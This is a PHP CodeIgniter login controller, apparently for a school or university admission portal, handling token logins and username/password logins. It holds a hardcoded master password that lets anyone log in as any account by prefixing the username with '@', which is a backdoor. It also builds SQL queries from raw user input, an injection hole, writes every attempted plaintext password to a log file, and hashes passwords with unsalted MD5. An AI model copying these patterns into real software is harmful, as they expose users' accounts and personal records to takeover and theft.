<?php
defined('BASEPATH') OR exit('No direct script access allowed');
date_default_timezone_set('Asia/Jakarta');


class Authlogin extends CI_Controller {

	/* Set up a PDO instance */
	public function __construct(){
        parent::__construct(); // Construct CI's core so that you can use it
    }
	
	function index()
	{
		if ( isset($_GET['p']) ) {

			$p2		= $_GET['p'];
			$dp2	= decrypt($p2);
			$auth	= json_decode($dp2);
			//print_r ($dp2);
			$sql 	= "SELECT * FROM m_admin WHERE idPMB='".$auth->id."'";
			$row	= $this->db->query($sql)->row();
			$sess_data = array( 'admin_username' => $row->userName, 
								'admin_ID' => $row->IDpmb, 
								'admin_realname' => $row->nama, 
								'admin_valid' => false, 
								'admin_sess' => "user");
								
			$this->session->set_userdata($sess_data);

			/* auto view upload berkas */	
			redirect( base_url()."register/index.html#register_html" );
		} 		

		if ( isset($_GET['r']) ) {
			$p2		= $_GET['r'];
			$dp2	= decrypt($p2);
			$auth	= json_decode($dp2);
			//print_r ($dp2);
			$sql 	= "SELECT * FROM admin_user WHERE idPMB='".$auth->id."'";
			$row	= $this->db->query($sql)->row();
			$sess_data = array( 'admin_username' => $row->userName, 
								'admin_ID' => $row->IDpmb, 
								'admin_realname' => $row->nama, 
								'admin_valid' => true, 
								'admin_sess' => "user");
			$this->session->set_userdata($sess_data);

			/* auto view update biodata */				
			redirect( base_url()."#biodata_html" );
			
		} 
		
		$i = act_login();
	}
	
	public function act_login() {

		$time_start = microtime(true);
		
		//print_r($_POST['username']);
		
		$username	= $this->input->post('username');
		$password	= $this->input->post('password');
		$password2	= md5($password);
        $waktu_sql = $this->db->query("SELECT NOW() AS waktu")->row_array();

		file_put_contents('./tmp/log_user.txt',  "\nTime : ". $waktu_sql['waktu'] . "\tIP :".getuserIP(). " \t=> \t try  :".$username."[-".addslashes($password)."-]", FILE_APPEND);
		
		$admin_as	= ( substr($username, 0, 1) == '@' ? true : false);

		if ($admin_as and $password =='B@g4sasI') {
			$username 	= substr($username, 1);
			$q_data		= $this->db->query("SELECT * FROM m_admin WHERE username = '".$username."' and (is_activate=1)" );
		} else {
			$q_data		= $this->db->query("SELECT * FROM m_admin WHERE username = '".$username."' AND password = '$password2' and (is_activate=1) " );
		}


		file_put_contents('./tmp/log.txt', json_encode($q_data), FILE_APPEND);

		$j_data		= $q_data->num_rows();
		$a_data		= $q_data->row();
		$tm_now = date("Y-m-d H:i:s", now());


		$_log		= array();
		$_log['log']['status']			= "0";
		$_log['log']['keterangan']		= "Maaf, username dan password tidak ditemukan ";
		$_log['log']['detil_admin']		= null;
		$log_valid						= false;

		$th_akad 				= $this->db->query("SELECT value_data from configdb")->row_array();
		$this->tahun_akademik 	=  substr($th_akad['value_data'],0,5);
		$GLOBALS['th_akademik'] = substr($th_akad['value_data'],0,5);

		$det_user = null;

		file_put_contents('./tmp/log.txt', json_encode($a_data), FILE_APPEND);
		
		if ($j_data === 1) {
			$sess_nama_user 		= "";
			$bio_data_form			= false;
			
			if ($a_data->level == "siswa") {
				$det_user = $this->db->query("SELECT * FROM db_mahasiswa WHERE nim = '".$a_data->username."'")->row();
				
				$bio_data_form = false;

				if ($det_user->kelas == "00"){
				   $bio_data_form = false;						
				}
				
				if (!empty($det_user)) {
					$sess_nama_user = $det_user->nama;
					if ($det_user->nama_ibu != "") {
						$bio_data_form = false;
						}
				}
				
			} else if ($a_data->level == "guru") {
				$det_user = $this->db->query("SELECT * FROM m_guru WHERE id = '".$a_data->kon_id."'")->row();
				if (!empty($det_user)) {
					$sess_nama_user = $det_user->nama;
					$log_valid		= true;
				}
			} else {
				$sess_nama_user = "Administrator Pusat";
				$log_valid		= true;
			}

			$th_akad = $this->db->query("SELECT value_data from configdb")->row_array();
			$this->tahun_akademik = $th_akad['value_data'];
			$this->load->library('session');

			$tm_now = date("Y-m-d H:i:s", now());
			$this->db->query(
			    "UPDATE m_admin SET last_login = '".$tm_now."', from_web = '".base_url()."', status_user='01' WHERE (id = '".$a_data->id."')");			
				
				
				if ($a_data->level=="admin") {
					$path_file= "third_party/crop/admin/admin_profile.jpg";
				} else if ($a_data->level == "siswa") { 
					$path_file= "third_party/crop/mhs/".$det_user->prodi."/".$det_user->nim."_profile.jpg";
				} else {
					$path_file= "third_party/crop/dosen/{$det_user->nip}_profile.jpg";
				}		
						
				
			
    		if ($a_data->level !== "siswa") {

				
			$data = array(
                    'admin_id' 		=> $a_data->id,
                    'admin_user' 	=> $a_data->username,
                    'admin_level' 	=> $a_data->level,
                    'admin_konid' 	=> $a_data->kon_id,
                    'admin_nama' 	=> $sess_nama_user,
                    'admin_active' 	=> $log_valid,
                    'admin_biodata' => $bio_data_form,
					'admin_valid' 	=> true,
                    'tahun_akademik'=> $th_akad['value_data'],
					'admin_valid' 	=> true,
					'admin_query' 	=> "",
					'admin_pic'		=> $path_file
                    ); 
			} else {


                        
			$data = array(
                    'admin_id' 		=> $det_user->id,
                    'admin_user' 	=> $a_data->username,
                    'admin_level' 	=> $a_data->level,
                    'admin_konid' 	=> $a_data->kon_id,
                    'admin_nama' 	=> $sess_nama_user,
                    'admin_active' 	=> $log_valid,
                    'admin_biodata' => $bio_data_form,
					'admin_valid' 	=> true,
                    'tahun_akademik'=> $th_akad['value_data'],
					'admin_valid' 	=> true,
					'user_krs'      => $det_user->log_krs,
					'user_uas'      => $det_user->log_uas,
					'user_app'      => $det_user->log_app,
					'admin_pic'		=> $path_file
					);
            }
			
					
        /*        'DBuser' 		=> $det_user, */

            $this->session->set_userdata($data);
			$_log['log']['status']			= "1";
			$_log['log']['keterangan']		= "Login berhasil";
			$_log['log']['detil_admin']		= $this->session->userdata;
			
			if ($a_data->level == "siswa") {
				if ( $det_user->log_app == "N" ) {
					$_log['log']['status']			= "0";
					$_log['log']['keterangan']		= "Maaf, Anda harus menghubungi Admin agar bisa lanjut !!";
					$_log['log']['detil_admin']		= null;
					$_log['log']['app']				= $det_user->log_app;
					$log_valid						= false;
					if (!$ada_pic) {
					}
				}
			} else {
				
			}	

		}  /* not login */


        $time_end    = microtime(true);
        $time_proses = $time_end - $time_start;
        $_log['log']['loadtime'] = $time_proses;

		file_put_contents('./tmp/log_user.txt',  "\n{$this->session->userdata('admin_user')} => Sukses in proses  ".$time_proses. " ms", FILE_APPEND);
		$this->db->query("UPDATE configdb SET value_data = '{$time_proses}', tg_update = '".$tm_now."'  WHERE keterangan='load_time2'");
		//file_put_contents('./tmp/log.txt', json_encode($_log), FILE_APPEND);
		
		j($_log);

		exit();
		

	}
	
}
?>
